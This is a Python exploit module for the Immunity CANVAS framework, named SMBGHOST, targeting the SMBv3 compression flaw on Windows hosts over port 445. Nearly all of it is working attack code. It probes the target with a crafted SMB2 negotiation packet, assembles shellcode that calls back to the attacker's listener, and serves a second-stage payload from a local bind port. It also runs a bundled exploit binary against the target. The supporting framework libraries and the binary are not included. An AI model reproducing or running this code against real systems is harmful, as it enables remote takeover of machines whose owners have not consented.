#!/usr/bin/env python
##ImmunityHeader v1
################################################################################
## File       :  SMBGHOST.py
## Description:
##            :
## Created_On :  Tue Jul 29 2020
## Created_By :  Nox
##
## (c) Copyright 2020, Immunity, Inc. all rights reserved.
################################################################################

import os
import sys
import time
import yaml
import struct
import socket
import select
import logging
import threading

if '.' not in sys.path:
    sys.path.append('.')


# Canvas API
import canvasengine
from tcpexploit import tcpexploit
from canvasexploit import canvasexploit
from ExploitTypes.windowsLocalExploit import WindowsLocalExploit


from shellcode.standalone.windows.payloads64 import payloads as payloads64
from shellcode.standalone.windows.payloads import payloads 

local_path = os.path.dirname(os.path.realpath(__file__))

with open(local_path + os.path.sep + 'canvas.yaml', 'r') as f:
    metadata = yaml.safe_load(f.read())

NAME          = metadata['NAME']
DESCRIPTION   = metadata['DESCRIPTION']
VERSION       = metadata['VERSION']
DOCUMENTATION = metadata['DOCUMENTATION']
PROPERTY      = metadata['PROPERTY']

smb2_negotiation_packet = "\x00\x00\x00\xb2\xfe\x53\x4d\x42\x40\x00"
smb2_negotiation_packet += "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
smb2_negotiation_packet += "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
smb2_negotiation_packet += "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
smb2_negotiation_packet += "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x24\x00\x05\x00\x00\x00"
smb2_negotiation_packet += "\x00\x00\x44\x00\x00\x00\x13\x37\xc0\xde\x13\x37\xc0\xde\x13\x37"
smb2_negotiation_packet += "\xc0\xde\x13\x37\xc0\xde\x70\x00\x00\x00\x02\x00\x00\x00\x02\x02"
smb2_negotiation_packet += "\x10\x02\x00\x03\x02\x03\x11\x03\x00\x00\x01\x00\x26\x00\x00\x00"
smb2_negotiation_packet += "\x00\x00\x01\x00\x20\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00"
smb2_negotiation_packet += "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
smb2_negotiation_packet += "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x0a\x00\x00\x00"
smb2_negotiation_packet += "\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00"



class theexploit(canvasexploit, object):
    def __init__(self):
        super(theexploit, self).__init__()
        #canvasexploit.__init__(self)

        self.name           =  NAME
        self.target_host    = ""
        self.target_port    = 445

        self.binaries_path  = os.path.join(local_path, "Resources")

        self.bind_port = 65001

        self.flag           = True
        self.return_failed  = False


    def getArgs(self):
        self.target_host = self.target.interface
        self.target_port = int(self.argsDict.get("port", self.target_port))


    def neededListenerTypes(self):
        return [canvasengine.UNIVERSAL_MOSDEF]


    def get_shellcode(self):
        logging.info(self.callback.ip)
        logging.info(self.callback.port)

        p = payloads64(module=self)
        asmy = p.InjectToSelf(self.callback.ip, self.callback.port)

        shellcode = p.assemble(asmy)

        return shellcode

    def send_mosdef(self):
        mosdef_shellcode = self.get_shellcode()

        s = None
        while (self.bind_port <= 65535):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.bind(('0.0.0.0', self.bind_port))
                s.listen(0)
                break
            except socket.error:
                s.close()
                s = None
                self.bind_port = self.bind_port + 1
                continue

        self.flag = False
        if (self.bind_port > 65535):
            self.flag = True
            return 

        logging.debug("bind port used by first stage %d" % self.bind_port)

        try:
            conn, addr = s.accept()
        except:
            logging.error("first connection stage timeout")
            s.close()
            self.return_failed = True
            return 

        logging.info("Sending second stage")
        time.sleep(1)
        conn.sendall(mosdef_shellcode)

        s.close()

        self.return_failed = False

    def verify_service(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((self.target_host, self.target_port))
        except socket.timeout:
            s.close()
            logging.error("SMB service is not avaible")
            return False
        except socket.error:
            s.close()
            logging.error("SMB connection timeout")
            return False
        except:
            s.close()
            logging.error("SMB connection error")
            return False

        try:
            s.send(smb2_negotiation_packet)
            response = s.recv(1024)

            if response[4:4+4] == "\xFESMB":
                logging.info("SMB Compression supported")
                return True

            logging.error("SMB Compression is not supported")
        except socket.error as err:
            s.close()
            logging.error("SMB negotation is not avaible")
            return False
        except socket.timeout:
            s.close()
            logging.error("SMB negotiation timeout ")
            return False

        return False


    def execute_local_executable(self):
        exploit_local_path = os.path.join(self.binaries_path, "exploit_x64.exe")

        try:
            cmd = "{0} {1} {2} {3}".format(exploit_local_path, self.callback.ip, self.bind_port, self.target_host)
            logging.debug("Exploit cmdline %s" % cmd)
            stdin, stdout = os.popen4(cmd)
            
            return True
        except Exception, ex:
            self.log_error("%s" % ex)
            return False

    def run(self):
        self.getArgs()
        logging.info("Target %s:%d" % (self.target_host, self.target_port) )

        logging.info("Verifing SMB service status")
        if not self.verify_service():
            return False

        logging.info("Setup first stage server")
        thr = threading.Thread(target=self.send_mosdef,)
        thr.start()

        thr.is_alive()

        #dirty flag
        while(self.flag):
            time.sleep(0.5)
        time.sleep(2)

        if self.flag:
            return False

        logging.info("Exploit execution")
        if not self.execute_local_executable():
            return False

        sleeptime = 60
        logging.info('Sleeping for %ds' % sleeptime)
        is_succeded = False
        for i in xrange(0, sleeptime, 2):
            if self.state == self.HALT:
                logging.info("Halted")
                break
            logging.info("Slept: %d" % i)
            if self.ISucceeded():
                is_succeded = True
                break
            if self.return_failed:
                break

            time.sleep(2)

        if is_succeded:
            logging.info('%s attacking %s:%d (succeeded!)' % (self.name, self.target_host, self.target_port))
            logging.info('%s done (Success!)' % (self.name))
            return True
        else:
            logging.info('%s attacking %s:%d (failed)' % (self.name, self.target_host, self.target_port))
            logging.error('%s done (failed)' % (self.name))
            return False

if __name__=='__main__':
    logging.info('Running CANVAS %s Exploit v%s' % (DESCRIPTION, VERSION))
    app = theexploit()
    ret = standard_callback_commandline(app)
    if ret not in [0, 1, None]:
        ret.interact()
